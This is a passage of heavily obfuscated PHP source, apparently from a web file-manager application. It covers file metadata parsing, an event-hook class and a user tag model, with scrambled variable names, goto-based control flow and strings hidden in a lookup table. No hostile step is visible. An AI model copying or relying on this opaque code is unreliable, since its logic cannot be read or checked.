$Aˆ¥áíã[$bİ¿²àî”] = $EŞĞÕ‡›—; } break; } $E„àö¶Èôõ = str_replace($EØçå¶ÑÛÏ[1362], $D‚œ±„ë÷ó, $f‘¹©Ò¼•¬); $EŞĞÕ‡›— = _get($Eù¦ŠÃÇŒà, $E„àö¶Èôõ); $EŞĞÕ‡›— = is_array($EŞĞÕ‡›—) ? $EŞĞÕ‡›—[0] : $EŞĞÕ‡›—; if ($EŞĞÕ‡›—) { break; } } if ($EŞĞÕ‡›— || $EŞĞÕ‡›— === 0 || $EŞĞÕ‡›— === !1) { $EŞĞÕ‡›— = self::valueReset($f‘¹©Ò¼•¬, $EŞĞÕ‡›—, $bİ¿²àî”); if ($EŞĞÕ‡›— !== null) { $Aˆ¥áíã[$bİ¿²àî”] = $EŞĞÕ‡›—; } } } $Aˆ¥áíã = self::valueResetAll($Aˆ¥áíã, $fÌíØ£í‚é); return $Aˆ¥áíã; } private static function psdParse($f“‚·ÅÛİ°) { $b¦Ì­ÏœË¬ =& $_SERVER[Ìó]; if (IO::fileSubstr($f“‚·ÅÛİ°, 0, 4) != $b¦Ì­ÏœË¬[1589]) { return !1; } $b›ÉŞ—ˆÆõ = getImageSize($f“‚·ÅÛİ°, $dÆ³–âøÁæ); if (!$b›ÉŞ—ˆÆõ) { return; } $C¿ÄÍÁ…İ£ = array($b¦Ì­ÏœË¬[1504] => $b›ÉŞ—ˆÆõ[0], $b¦Ì­ÏœË¬[1506] => $b›ÉŞ—ˆÆõ[1]); return $C¿ÄÍÁ…İ£; } private static function pdfParse($Cƒª‹ó¹Ù÷) { return FileParsePdf::parse($Cƒª‹ó¹Ù÷); } private static function fileTypeParse() { $Aè¨ä‚±¡Â =& $_SERVER[Ìó]; $E¼µ˜“µ = self::fileTypeArray(); $Dï…áàÅÈ = array(); foreach ($E¼µ˜“µ as $fê“áö‰Ë => $D¢Àç™…ƒ) { $dÍ–—¬Ø†õ = _get($D¢Àç™…ƒ, $Aè¨ä‚±¡Â[156], $Aè¨ä‚±¡Â[33]); $d½“¯´Õî¡ = is_string($dÍ–—¬Ø†õ) ? explode($Aè¨ä‚±¡Â[47], $dÍ–—¬Ø†õ) : $dÍ–—¬Ø†õ; if (!$d½“¯´Õî¡) { continue; } foreach ($d½“¯´Õî¡ as $dÍ–—¬Ø†õ) { $dÍ–—¬Ø†õ = strtolower(trim($dÍ–—¬Ø†õ)); if (!$dÍ–—¬Ø†õ) { continue; } $Dï…áàÅÈ[$dÍ–—¬Ø†õ] = $fê“áö‰Ë; } $E¼µ˜“µ[$fê“áö‰Ë][$Aè¨ä‚±¡Â[156]] = array_keys($Dï…áàÅÈ); $E¼µ˜“µ[$fê“áö‰Ë][$Aè¨ä‚±¡Â[1587]] = self::parseKeyMap($D¢Àç™…ƒ[$Aè¨ä‚±¡Â[1587]]); } return array($Aè¨ä‚±¡Â[1586] => $E¼µ˜“µ, $Aè¨ä‚±¡Â[1585] => $Dï…áàÅÈ); } private static function parseKeyMap($D«·˜‹ÙÂ¶) { $dèò«šÛš† =& $_SERVER[Ìó]; foreach ($D«·˜‹ÙÂ¶ as $EÓ·‡‹ªË => $EÏ¸ƒ¯Ñ) { if (is_array($EÏ¸ƒ¯Ñ)) { $e‚¥×Ã„Í = self::parseKeyMap($EÏ¸ƒ¯Ñ); if ($e‚¥×Ã„Í) { $D«·˜‹ÙÂ¶[$EÓ·‡‹ªË] = $e‚¥×Ã„Í; } continue; } $d•ª‰ ºÇ— = explode($dèò«šÛš†[47], $EÏ¸ƒ¯Ñ); $fÈõïâ¿š = array(); foreach ($d•ª‰ ºÇ— as $FÈŠÃå…¯) { $FÈŠÃå…¯ = trim($FÈŠÃå…¯); if (!$FÈŠÃå…¯) { continue; } if (preg_match($dèò«šÛš†[1590], $FÈŠÃå…¯, $AÈù«Ñ¸Ñ…)) { $AÛøĞ¸„ = explode($dèò«šÛš†[267], $AÈù«Ñ¸Ñ…[1]); foreach ($AÛøĞ¸„ as $cŠ‹º­®Ÿ) { $fÈõïâ¿š[] = str_replace($AÈù«Ñ¸Ñ…[0], $cŠ‹º­®Ÿ, $FÈŠÃå…¯); } } else { $fÈõïâ¿š[] = $FÈŠÃå…¯; } } $D«·˜‹ÙÂ¶[$EÓ·‡‹ªË] = $fÈõïâ¿š; } return $D«·˜‹ÙÂ¶; } private static function valueResetAll($bµ…÷ÙæÒ­, $bÆÆ÷©Ì”ç) { goto e‡‚¾–…’à; C”‚Î±‹ğ³: $BÇÏñ±¿Ûó = _get($bµ…÷ÙæÒ­, $EÊÖ»¹Ãç[1603], $EÊÖ»¹Ãç[33]); $a Ò®á“ª‚ = $B°¦Âë›¡ê . $DˆôˆêÉáò . $BÇÏñ±¿Ûó; if ($a Ò®á“ª‚ && get_charset($a Ò®á“ª‚) != $EÊÖ»¹Ãç[322]) { $bµ…÷ÙæÒ­[$EÊÖ»¹Ãç[1600]][$EÊÖ»¹Ãç[1317]] = iconv_to($bµ…÷ÙæÒ­[$EÊÖ»¹Ãç[1600]][$EÊÖ»¹Ãç[1317]], get_charset($a Ò®á“ª‚), $EÊÖ»¹Ãç[322]); $bµ…÷ÙæÒ­[$EÊÖ»¹Ãç[1600]][$EÊÖ»¹Ãç[1604]] = iconv_to($bµ…÷ÙæÒ­[$EÊÖ»¹Ãç[1600]][$EÊÖ»¹Ãç[1604]], get_charset($a Ò®á“ª‚), $EÊÖ»¹Ãç[322]); $bµ…÷ÙæÒ­[$EÊÖ»¹Ãç[1600]][$EÊÖ»¹Ãç[1605]] = iconv_to($bµ…÷ÙæÒ­[$EÊÖ»¹Ãç[1600]][$EÊÖ»¹Ãç[1605]], get_charset($a Ò®á“ª‚), $EÊÖ»¹Ãç[322]); } goto BÅíÃ»“Íƒ; e‡‚¾–…’à: $EÊÖ»¹Ãç =& $_SERVER[Ìó]; if (isset($bµ…÷ÙæÒ­[$EÊÖ»¹Ãç[1591]])) { $a‰¹±•ëƒ­ = ceil($bµ…÷ÙæÒ­[$EÊÖ»¹Ãç[1591]]); $BŒÛÔù÷î· = intval($a‰¹±•ëƒ­ / 3600); $Dó–â±õÍ = intval(($a‰¹±•ëƒ­ - $BŒÛÔù÷î· * 3600) / 60); $F”ƒ›…¯ = $a‰¹±•ëƒ­ % 60; $bµ…÷ÙæÒ­[$EÊÖ»¹Ãç[1592]] = sprintf($EÊÖ»¹Ãç[1593], $BŒÛÔù÷î·, $Dó–â±õÍ, $F”ƒ›…¯); if ($BŒÛÔù÷î· == 0) { $bµ…÷ÙæÒ­[$EÊÖ»¹Ãç[1592]] = sprintf($EÊÖ»¹Ãç[1594], $Dó–â±õÍ, $F”ƒ›…¯); } } $f¨—˜§Ş×ï = _get($bµ…÷ÙæÒ­, $EÊÖ»¹Ãç[1595]); goto d‘Û†•Ø¯; BÅíÃ»“Íƒ: return $bµ…÷ÙæÒ­; goto bˆÉ‹Ê×à­; d‘Û†•Ø¯: if ($f¨—˜§Ş×ï) { $Eì„ôå—Šµ = IO_PATH_SYSTEM_TEMP . $EÊÖ»¹Ãç[1596] . KodIO::hashPath($bÆÆ÷©Ì”ç) . $EÊÖ»¹Ãç[1597]; $bµ…÷ÙæÒ­[$EÊÖ»¹Ãç[1598]] = Action($EÊÖ»¹Ãç[1599])->pluginCacheFileSet($Eì„ôå—Šµ, $f¨—˜§Ş×ï); unset($bµ…÷ÙæÒ­[$EÊÖ»¹Ãç[1600]][$EÊÖ»¹Ãç[1583]]); } $B°¦Âë›¡ê = _get($bµ…÷ÙæÒ­, $EÊÖ»¹Ãç[1601], $EÊÖ»¹Ãç[33]); $DˆôˆêÉáò = _get($bµ…÷ÙæÒ­, $EÊÖ»¹Ãç[1602], $EÊÖ»¹Ãç[33]); goto C”‚Î±‹ğ³; bˆÉ‹Ê×à­: } private static function valueReset($a„ğœ Ğ‚ª, $e¦ÊË»â“, $e‡æˆ¦Ì‰¥) { $e‚™šğ»åŠ =& $_SERVER[Ìó]; $C§ÚÈÜõš = $e‚™šğ»åŠ[1521]; switch ($a„ğœ Ğ‚ª) { case $e‚™šğ»åŠ[1606]: $e¦ÊË»â“ = $e¦ÊË»â“ == $e‚™šğ»åŠ[83] ? $e‚™šğ»åŠ[1607] : $e‚™šğ»åŠ[1608]; break; case $e‚™šğ»åŠ[1609]: $e¦ÊË»â“ = $e¦ÊË»â“ ? $e¦ÊË»â“ : null; break; default: break; } switch ($e‡æˆ¦Ì‰¥) { case $e‚™šğ»åŠ[1610]: $e¦ÊË»â“ = round($e¦ÊË»â“, 2); break; case $e‚™šğ»åŠ[183]: case $e‚™šğ»åŠ[106]: if ($e¦ÊË»â“ < 0) { $e¦ÊË»â“ = null; } else { if (is_numeric($e¦ÊË»â“)) { $e¦ÊË»â“ = date($C§ÚÈÜõš, $e¦ÊË»â“); } } break; default: break; } return $e¦ÊË»â“; } private static function fileTypeArray() { $d«ô÷Œ‹¹Á =& $_SERVER[Ìó]; return array($d«ô÷Œ‹¹Á[1583] => array($d«ô÷Œ‹¹Á[156] => $d«ô÷Œ‹¹Á[1611] . $d«ô÷Œ‹¹Á[1612], $d«ô÷Œ‹¹Á[1587] => array($d«ô÷Œ‹¹Á[1504] => $d«ô÷Œ‹¹Á[1613], $d«ô÷Œ‹¹Á[1506] => $d«ô÷Œ‹¹Á[1614], $d«ô÷Œ‹¹Á[1615] => $d«ô÷Œ‹¹Á[1616], $d«ô÷Œ‹¹Á[1617] => $d«ô÷Œ‹¹Á[1618], $d«ô÷Œ‹¹Á[183] => $d«ô÷Œ‹¹Á[1619], $d«ô÷Œ‹¹Á[106] => $d«ô÷Œ‹¹Á[1620], $d«ô÷Œ‹¹Á[1621] => $d«ô÷Œ‹¹Á[1622], $d«ô÷Œ‹¹Á[1623] => $d«ô÷Œ‹¹Á[1624], $d«ô÷Œ‹¹Á[1625] => $d«ô÷Œ‹¹Á[1626], $d«ô÷Œ‹¹Á[1627] => $d«ô÷Œ‹¹Á[1628], $d«ô÷Œ‹¹Á[1629] => $d«ô÷Œ‹¹Á[1630], $d«ô÷Œ‹¹Á[1631] => $d«ô÷Œ‹¹Á[1632], $d«ô÷Œ‹¹Á[1633] => $d«ô÷Œ‹¹Á[1634], $d«ô÷Œ‹¹Á[1635] => array($d«ô÷Œ‹¹Á[1636] => $d«ô÷Œ‹¹Á[1637], $d«ô÷Œ‹¹Á[1638] => $d«ô÷Œ‹¹Á[1639], $d«ô÷Œ‹¹Á[1640] => $d«ô÷Œ‹¹Á[1641]), $d«ô÷Œ‹¹Á[1642] => $d«ô÷Œ‹¹Á[1643], $d«ô÷Œ‹¹Á[1644] => $d«ô÷Œ‹¹Á[1645], $d«ô÷Œ‹¹Á[1646] => $d«ô÷Œ‹¹Á[1647], $d«ô÷Œ‹¹Á[1648] => $d«ô÷Œ‹¹Á[1649], $d«ô÷Œ‹¹Á[1650] => array($d«ô÷Œ‹¹Á[1651] => $d«ô÷Œ‹¹Á[1652], $d«ô÷Œ‹¹Á[1653] => $d«ô÷Œ‹¹Á[1654], $d«ô÷Œ‹¹Á[1655] => $d«ô÷Œ‹¹Á[1656], $d«ô÷Œ‹¹Á[1657] => $d«ô÷Œ‹¹Á[1658], $d«ô÷Œ‹¹Á[1659] => $d«ô÷Œ‹¹Á[1660], $d«ô÷Œ‹¹Á[1661] => $d«ô÷Œ‹¹Á[1662], $d«ô÷Œ‹¹Á[1663] => $d«ô÷Œ‹¹Á[1664], $d«ô÷Œ‹¹Á[1665] => $d«ô÷Œ‹¹Á[1666], $d«ô÷Œ‹¹Á[1667] => $d«ô÷Œ‹¹Á[1668], $d«ô÷Œ‹¹Á[1669] => $d«ô÷Œ‹¹Á[1670], $d«ô÷Œ‹¹Á[1671] => $d«ô÷Œ‹¹Á[1672]))), $d«ô÷Œ‹¹Á[1673] => array($d«ô÷Œ‹¹Á[156] => $d«ô÷Œ‹¹Á[1674] . $d«ô÷Œ‹¹Á[1675], $d«ô÷Œ‹¹Á[1587] => array($d«ô÷Œ‹¹Á[1591] => $d«ô÷Œ‹¹Á[1676], $d«ô÷Œ‹¹Á[183] => $d«ô÷Œ‹¹Á[1677], $d«ô÷Œ‹¹Á[106] => $d«ô÷Œ‹¹Á[1678], $d«ô÷Œ‹¹Á[1623] => $d«ô÷Œ‹¹Á[1679], $d«ô÷Œ‹¹Á[1680] => $d«ô÷Œ‹¹Á[1681], $d«ô÷Œ‹¹Á[1682] => $d«ô÷Œ‹¹Á[1609], $d«ô÷Œ‹¹Á[1683] => $d«ô÷Œ‹¹Á[1684], $d«ô÷Œ‹¹Á[1685] => $d«ô÷Œ‹¹Á[1686], $d«ô÷Œ‹¹Á[1687] => $d«ô÷Œ‹¹Á[1688], $d«ô÷Œ‹¹Á[1600] => array($d«ô÷Œ‹¹Á[1317] => $d«ô÷Œ‹¹Á[1689], $d«ô÷Œ‹¹Á[1604] => $d«ô÷Œ‹¹Á[1690], $d«ô÷Œ‹¹Á[1605] => $d«ô÷Œ‹¹Á[1691], $d«ô÷Œ‹¹Á[1692] => $d«ô÷Œ‹¹Á[1693], $d«ô÷Œ‹¹Á[1694] => $d«ô÷Œ‹¹Á[1695], $d«ô÷Œ‹¹Á[1696] => $d«ô÷Œ‹¹Á[1697], $d«ô÷Œ‹¹Á[1583] => $d«ô÷Œ‹¹Á[1698]))), $d«ô÷Œ‹¹Á[1699] => array($d«ô÷Œ‹¹Á[156] => $d«ô÷Œ‹¹Á[1700] . $d«ô÷Œ‹¹Á[1701], $d«ô÷Œ‹¹Á[1587] => array($d«ô÷Œ‹¹Á[1504] => $d«ô÷Œ‹¹Á[1702], $d«ô÷Œ‹¹Á[1506] => $d«ô÷Œ‹¹Á[1703], $d«ô÷Œ‹¹Á[1591] => $d«ô÷Œ‹¹Á[1676], $d«ô÷Œ‹¹Á[183] => $d«ô÷Œ‹¹Á[1704], $d«ô÷Œ‹¹Á[106] => $d«ô÷Œ‹¹Á[1705], $d«ô÷Œ‹¹Á[1610] => $d«ô÷Œ‹¹Á[1706], $d«ô÷Œ‹¹Á[1687] => $d«ô÷Œ‹¹Á[1707], $d«ô÷Œ‹¹Á[1683] => $d«ô÷Œ‹¹Á[1708], $d«ô÷Œ‹¹Á[1623] => $d«ô÷Œ‹¹Á[1709], $d«ô÷Œ‹¹Á[1673] => array($d«ô÷Œ‹¹Á[1682] => $d«ô÷Œ‹¹Á[1609], $d«ô÷Œ‹¹Á[1710] => $d«ô÷Œ‹¹Á[1711], $d«ô÷Œ‹¹Á[1680] => $d«ô÷Œ‹¹Á[1681], $d«ô÷Œ‹¹Á[1687] => $d«ô÷Œ‹¹Á[1688], $d«ô÷Œ‹¹Á[1683] => $d«ô÷Œ‹¹Á[1712], $d«ô÷Œ‹¹Á[1685] => $d«ô÷Œ‹¹Á[1686]))), $d«ô÷Œ‹¹Á[1713] => array($d«ô÷Œ‹¹Á[1587] => array($d«ô÷Œ‹¹Á[1714] => $d«ô÷Œ‹¹Á[1715], $d«ô÷Œ‹¹Á[1716] => $d«ô÷Œ‹¹Á[1717])), $d«ô÷Œ‹¹Á[1718] => array($d«ô÷Œ‹¹Á[1587] => array())); } } class Hook { private static $events = array(); public static function get($Cƒ±¼‘æ•… = false) { if (!$Cƒ±¼‘æ•…) { return self::$events; } else { return self::$events[$Cƒ±¼‘æ•…]; } } public static function apply($bÜ«÷ÕÚ·¦, $fºÏ‘ôØ·Û = array()) { $E…Œ³‚Ï¤Ù = ActionApply($bÜ«÷ÕÚ·¦, $fºÏ‘ôØ·Û); if (is_string($bÜ«÷ÕÚ·¦)) { Hook::trigger($bÜ«÷ÕÚ·¦); } return $E…Œ³‚Ï¤Ù; } public static function bind($a‹“îóËšé, $DŞµ°¿ªî”, $eÆÁ¯öŒÏ™ = false) { $A³®‹¹¾…– =& $_SERVER[Ìó]; if (!isset(self::$events[$a‹“îóËšé])) { self::$events[$a‹“îóËšé] = array(); } self::$events[$a‹“îóËšé][] = array($A³®‹¹¾…–[1719] => $DŞµ°¿ªî”, $A³®‹¹¾…–[1720] => $eÆÁ¯öŒÏ™, $A³®‹¹¾…–[1721] => 0); } public static function once($aÍÑí§½„¶, $Bé»¥å–ø´) { self::bind($aÍÑí§½„¶, $Bé»¥å–ø´, !0); } public static function unbind($b£ç¼•Ò‚æ, $F‘´ÉÈ¤ = false) { if (!$F‘´ÉÈ¤) { self::$events[$b£ç¼•Ò‚æ] = array(); return; } $dêÈÜ¦Ôî‹ = self::$events[$b£ç¼•Ò‚æ]; self::$events[$b£ç¼•Ò‚æ] = array(); if (!is_array($dêÈÜ¦Ôî‹)) { return; } for ($F¬«’¦¶› = 0; $F¬«’¦¶› < count($dêÈÜ¦Ôî‹); $F¬«’¦¶›++) { if ($dêÈÜ¦Ôî‹[$F¬«’¦¶›][$_SERVER[Ìó][1719]] == $F‘´ÉÈ¤) { continue; } self::$events[$b£ç¼•Ò‚æ][] = $dêÈÜ¦Ôî‹[$F¬«’¦¶›]; } } public static function filter($BÌïİ÷Ú£â, $d¼öé‘”ä) { goto b©æ·‹Ê‰; B´¯Ã†¯§°: $bùŠä–Ï’™ = $D–í³Ö°… [$BÌïİ÷Ú£â]; $DÛ‘ÏóØ = $d¼öé‘”ä; if (!is_array($bùŠä–Ï’™) || count($bùŠä–Ï’™) == 0) { return $DÛ‘ÏóØ; } goto fôàÈ¾–·; fôàÈ¾–·: for ($dÃ×†°ÓÕÅ = 0; $dÃ×†°ÓÕÅ < count($bùŠä–Ï’™); $dÃ×†°ÓÕÅ++) { $d†™Î·ˆÆî = $bùŠä–Ï’™[$dÃ×†°ÓÕÅ]; if ($d†™Î·ˆÆî[$a¦Úáôáåã[1720]] && $d†™Î·ˆÆî[$a¦Úáôáåã[1721]] > 1) { continue; } self::$events[$BÌïİ÷Ú£â][$dÃ×†°ÓÕÅ][$a¦Úáôáåã[1721]] = $d†™Î·ˆÆî[$a¦Úáôáåã[1721]] + 1; $DÂñæõç™ = self::apply($d†™Î·ˆÆî[$a¦Úáôáåã[1719]], array($DÛ‘ÏóØ)); if (gettype($DÂñæõç™) == gettype($DÛ‘ÏóØ)) { $DÛ‘ÏóØ = $DÂñæõç™; } } return $DÛ‘ÏóØ; goto E÷ğÜ†µ© ; b©æ·‹Ê‰: $a¦Úáôáåã =& $_SERVER[Ìó]; $D–í³Ö°…  = self::$events; if (!isset($D–í³Ö°… [$BÌïİ÷Ú£â])) { return $d¼öé‘”ä; } goto B´¯Ã†¯§°; E÷ğÜ†µ© : } public static function trigger($bá›ÕÚ­¼ï) { goto eêàğÖ†›·; bÅÛé–•Œ: if (!isset($aµÏà¾êÓ»[$bá›ÕÚ­¼ï])) { return $FÑŒé²¯¼; } $D òµøª¶¯ = $aµÏà¾êÓ»[$bá›ÕÚ­¼ï]; if (!is_array($D òµøª¶¯) || count($D òµøª¶¯) == 0) { return $FÑŒé²¯¼; } goto e©ˆÒÒè; e©ˆÒÒè: $dâÒ‚¢¤ÌÓ = func_get_args(); array_shift($dâÒ‚¢¤ÌÓ); for ($cø¥—¶Ç¡Ì = 0; $cø¥—¶Ç¡Ì < count($D òµøª¶¯); $cø¥—¶Ç¡Ì++) { $c§ˆ‹ÜÍö¥ = $D òµøª¶¯[$cø¥—¶Ç¡Ì]; if ($c§ˆ‹ÜÍö¥[$aÌ‡×„Ó‹[1720]] && $c§ˆ‹ÜÍö¥[$aÌ‡×„Ó‹[1721]] > 1) { continue; } if (defined($aÌ‡×„Ó‹[1722]) && GLOBAL_LOG_HOOK) { write_log($bá›ÕÚ­¼ï . $aÌ‡×„Ó‹[1723] . $c§ˆ‹ÜÍö¥[$aÌ‡×„Ó‹[1719]], $aÌ‡×„Ó‹[1724]); } self::$events[$bá›ÕÚ­¼ï][$cø¥—¶Ç¡Ì][$aÌ‡×„Ó‹[1721]] = $c§ˆ‹ÜÍö¥[$aÌ‡×„Ó‹[1721]] + 1; $c† ¾¤© = self::apply($c§ˆ‹ÜÍö¥[$aÌ‡×„Ó‹[1719]], $dâÒ‚¢¤ÌÓ); if (defined($aÌ‡×„Ó‹[1722]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $aÌ‡×„Ó‹[1724]); if ($c§ˆ‹ÜÍö¥[$aÌ‡×„Ó‹[1721]] == 200) { $E×¡”ÜÉ‹ = is_array($c§ˆ‹ÜÍö¥[$aÌ‡×„Ó‹[1719]]) ? json_encode_force($c§ˆ‹ÜÍö¥[$aÌ‡×„Ó‹[1719]]) : $c§ˆ‹ÜÍö¥[$aÌ‡×„Ó‹[1719]]; write_log($aÌ‡×„Ó‹[1725] . $bá›ÕÚ­¼ï . $aÌ‡×„Ó‹[1726] . $E×¡”ÜÉ‹, $aÌ‡×„Ó‹[1727]); } } $FÑŒé²¯¼ = is_null($c† ¾¤©) ? $FÑŒé²¯¼ : $c† ¾¤©; } goto DÕ‘’‰ à„; eêàğÖ†›·: $aÌ‡×„Ó‹ =& $_SERVER[Ìó]; $aµÏà¾êÓ» = self::$events; $FÑŒé²¯¼ = !1; goto bÅÛé–•Œ; DÕ‘’‰ à„: return $FÑŒé²¯¼; goto dº®òÄ×ö; dº®òÄ×ö: } } goto e²ğ÷¢ÖãÅ; EåëÕó×ç: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\145\x72\x5f\x66\141\x76"; protected function cacheFunctionAlias($c£‡ä¨Ûâô) { $B‘ ¤ˆ² =& $_SERVER[Ìó]; return array($B‘ ¤ˆ²[2447] => array(USER_ID, $B‘ ¤ˆ²[2503])); } protected function listData() { $aºØÓÀ¢‹ò =& $_SERVER[Ìó]; $FåòÁîâÌµ = array($aºØÓÀ¢‹ò[1400] => USER_ID, $aºØÓÀ¢‹ò[431] => array($aºØÓÀ¢‹ò[2504], 0)); $AİÚ¼âƒ³­ = $aºØÓÀ¢‹ò[2505]; $FØ±‰…¡ò¸ = $aºØÓÀ¢‹ò[2506]; $dËÓÅ’Û„ç = $this->field($AİÚ¼âƒ³­)->where($FåòÁîâÌµ)->order($FØ±‰…¡ò¸)->select(); return $dËÓÅ’Û„ç ? $dËÓÅ’Û„ç : array(); } protected function listByTag($Bìêğñšš¦) { } protected function addToTag($eªÜ–ì½¢, $E‡¶‘«†Š) { $B¨‰¼•·— =& $_SERVER[Ìó]; if (!Model($B¨‰¼•·—[2272])->listData($E‡¶‘«†Š) || !Model($B¨‰¼•·—[748])->pathInfo($eªÜ–ì½¢)) { return !1; } $Aáàâ™‚ãï = array($B¨‰¼•·—[1400] => USER_ID, $B¨‰¼•·—[431] => $E‡¶‘«†Š, $B¨‰¼•·—[383] => $eªÜ–ì½¢, $B¨‰¼•·—[384] => $B¨‰¼•·—[378], $B¨‰¼•·—[382] => $B¨‰¼•·—[33], $B¨‰¼•·—[2076] => 0); if ($this->where($Aáàâ™‚ãï)->find()) { return !1; } return $this->add($Aáàâ™‚ãï); } protected function removeFromTag($aŞ”¾‡˜èÕ, $c†Â–œáğ´) { $Bóµ˜âÄê =& $_SERVER[Ìó]; if (!Model($Bóµ˜âÄê[2272])->listData($c†Â–œáğ´) || !Model($Bóµ˜âÄê[748])->pathInfo($aŞ”¾‡˜èÕ)) { return !1; } $c™Àİ®›ÆÚ = array($Bóµ˜âÄê[1400] => USER_ID, $Bóµ˜âÄê[431] => $c†Â–œáğ´, $Bóµ˜âÄê[384] => $Bóµ˜âÄê[378], $Bóµ˜âÄê[383] => $aŞ”¾‡˜èÕ); return $this->where($c™Àİ®›ÆÚ)->delete(); } protected function removeByTag($C—Â‡«óã) { $A‚ÉâŸ¯Æ =& $_SERVER[Ìó]; if (!$C—Â‡«óã) { return !1; } $FÁï¥ç § = array($A‚ÉâŸ¯Æ[1400] => USER_ID, $A‚ÉâŸ¯Æ[431] => $C—Â‡«óã); return $this->where($FÁï¥ç §)->delete(); } protected function removeBySource($E£³†¦ñ¾) { $b´¾¥‰¿èï =& $_SERVER[Ìó]; $B˜’Øƒùª = array($b´¾¥‰¿èï[1400] => USER_ID, $b´¾¥‰¿èï[383] => $E£³†¦ñ¾, $b´¾¥‰¿èï[431] => array($b´¾¥‰¿èï[926], 0)); return $this->where($B˜’Øƒùª)->delete(); } }